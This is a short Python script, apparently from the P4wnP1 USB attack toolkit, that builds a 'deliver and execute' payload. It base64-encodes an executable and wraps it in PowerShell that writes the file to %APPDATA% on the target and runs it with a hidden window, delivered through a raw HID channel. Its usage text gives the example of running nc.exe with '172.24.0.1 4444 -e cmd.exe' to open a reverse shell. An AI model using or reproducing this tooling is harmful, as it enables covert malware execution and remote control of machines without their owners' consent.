import sys

print "***********************************************************************\n"
print "P4wnP1 Deliver and Execute Payload Generator\n"
print "Takes an Executable file, convert it to base64\n" 
print "creates a powershell payload to be delivered via P4wnP1 RAW HID channel\n"
print "File will be save to %APPDATA% on target machine\n"
print "***********************************************************************\n"

print """
On the P4wnP1:
==============

- Set P4wnP1 as Keyboard and RAW HID
- Copy Stage2.ps1 to "/usr/local/P4wnP1/legacy/"

Run the following commands:
===========================

- hidraw=$(P4wnP1_cli usb get device raw)
- python  /usr/local/P4wnP1/legacy/hidstager.py -s -i  /usr/local/P4wnP1/legacy/Stage2.ps1 -o $hidraw

Execute the wifi_covert_channel.js HIDscrtip

"""

if len(sys.argv) != 4:
	print "\r\nUsage Examples:\r\n"
	print "[+] Using Args: " + sys.argv[0] + " /tmp/nc.exe out.exe \"172.24.0.1 4444 -e cmd.exe\"\r\n"
	print "[+] No Args: " + sys.argv[0] + " /tmp/nc.exe out.exe \"\"\r\n"
	sys.exit()


PE_FILE = sys.argv[1]
OUTPUT_FILE = sys.argv[2]
EXEARGS= sys.argv[3]


def b64encode(data):
        import base64
        return base64.b64encode(data)


def get_bytes_from_file(filename):
	EncData = b64encode(open(filename, "rb").read())
	return "$c='{0}';".format(EncData)


if EXEARGS:
	ps = "$PEBytes = [System.Convert]::FromBase64String($c);$PEBytes | Set-Content $env:APPDATA\\" + OUTPUT_FILE + " -Encoding Byte;Start-Process $env:APPDATA\\" + OUTPUT_FILE + " -Args \"" + EXEARGS  + "\"  -WindowStyle Hidden"
else:
	ps = "$PEBytes = [System.Convert]::FromBase64String($c);$PEBytes | Set-Content $env:APPDATA\\" + OUTPUT_FILE + " -Encoding Byte;Start-Process $env:APPDATA\\" + OUTPUT_FILE + " -WindowStyle Hidden"



ps_script = get_bytes_from_file(PE_FILE) + ps


file = open("Stage2.ps1","w")  
file.write(ps_script) 
file.close() 
print "\r\n[+] Payload written to Stage2.ps1"





